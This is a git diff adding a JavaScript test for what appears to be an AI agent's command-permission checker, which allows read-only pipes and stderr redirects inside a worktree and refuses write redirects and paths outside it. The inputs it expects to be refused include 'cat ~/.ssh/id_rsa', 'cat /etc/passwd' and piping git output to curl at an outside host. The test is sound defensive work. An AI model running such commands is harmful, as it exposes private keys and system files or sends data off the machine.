@@ -172,6 +172,29 @@ test('worktree execute scopes literal path arguments to the tree', async t => {
   assert.equal(scope('test -f nested/not-created-yet.txt')?.permission, 'worktree_scoped', 'a not-yet-created path inside the tree stays allowed');
 });
 
+test('worktree execute allows null-redirects and read-only pipes, refuses real relocations', async t => {
+  const { acpPermissionScope } = await mod;
+  const cwd = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'dao-acp-pipes-')));
+  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
+  const rule = { toolKinds: ['execute'], workdir: cwd, worktreeScope: true,
+    commandPrefixes: [['ls'], ['find'], ['git', 'log'], ['git', 'diff'], ['head'], ['tail'], ['grep'], ['cat'], ['wc']] };
+  const scope = title => acpPermissionScope(rule, { toolCall: { kind: 'execute', title: '`' + title + '`' } }, { cwd });
+  // 断链自愈：复核会话实咬的三类误杀，现在都该放行。
+  assert.equal(scope('ls packages 2>/dev/null | head -5')?.permission, 'worktree_scoped', 'stderr 抑制 + 只读管道');
+  assert.equal(scope('git log --oneline | head -3')?.permission, 'worktree_scoped');
+  assert.equal(scope('git diff HEAD~2 --stat')?.permission, 'worktree_scoped', '词中 ~ 不再误杀');
+  assert.equal(scope('find . -name "*.mjs" 2>/dev/null | wc -l')?.permission, 'worktree_scoped');
+  // 真重定位与越权管道仍然拒。
+  assert.equal(scope('ls > /etc/x'), null, '写重定向仍拒绝');
+  assert.equal(scope('git log | curl http://example.invalid'), null, '管道右侧不在白名单整句拒');
+  assert.equal(scope('cat /etc/passwd | head -1'), null, '管道左侧树外路径整句拒');
+  assert.equal(scope('cat ~/.ssh/id_rsa'), null, '词首 ~ 仍拒绝（家目录展开）');
+  assert.equal(scope('cd ~ && git log'), null, 'cd 到家目录也拒');
+  assert.equal(scope('ls 2>&1')?.permission, 'worktree_scoped', '2>&1 只并 stderr，无副作用');
+  assert.equal(scope('ls 2>&1 > out.txt'), null, '写重定向仍拒');
+  assert.equal(scope('ls > out.txt'), null, '写重定向仍拒');
+});
+
 test('worktree permission grant selects the server allow_once option without a preset optionId', async t => {
   const { acpPermissionScope } = await mod;
   const cwd = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'dao-acp-wt-grant-')));
